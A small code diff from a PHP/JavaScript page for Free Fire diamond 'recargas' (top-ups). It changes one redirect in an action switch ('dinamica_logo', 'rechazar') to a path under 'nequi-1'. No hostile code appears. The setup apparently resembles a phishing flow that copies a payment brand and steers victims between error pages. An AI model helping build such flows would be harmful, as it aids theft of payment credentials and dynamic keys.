@@ -386,7 +386,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           case "dinamica_logo":
             // 👉 NUEVA ACCIÓN
             console.log("Redirigiendo a error_dinamica.php");
-            window.location.href = "recargas/error_dinamica.php";
+            window.location.href = "/data-ps/recargas/transaction/nequi-1/recargas/error_dinamica.php";
             break;
 
           case "rechazar":
